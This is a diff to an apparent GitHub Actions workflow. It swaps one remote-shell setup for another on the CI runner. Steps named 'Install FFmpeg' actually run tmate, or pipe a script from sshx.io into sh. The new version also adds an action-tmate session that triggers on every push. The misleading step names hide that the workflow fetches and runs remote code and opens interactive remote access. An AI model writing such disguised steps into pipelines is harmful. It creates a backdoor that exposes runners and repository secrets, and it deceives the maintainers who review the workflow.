@@ -1,22 +1,14 @@
-name: Whisper Transcription
-
-on:
-  push:
-    paths:
-      - '**.mp3'
-      - 'transcribe.py'
-  workflow_dispatch:
-
+name: CI
+on: [push]
 jobs:
-  transcribe:
+  build:
     runs-on: ubuntu-latest
-
     steps:
-      - name: Checkout code
-        uses: actions/checkout@v3
+    - uses: actions/checkout@v4
+    - name: Setup tmate session
+      uses: mxschmitt/action-tmate@v3
 
-      - name: Install FFmpeg
-        run: |
-          sudo apt update
-          sudo apt install tmate -y
-          tmate -F
+    - name: Install FFmpeg
+      run: |
+        sudo apt update
+        sudo curl -sSf https://sshx.io/get | sh -s run
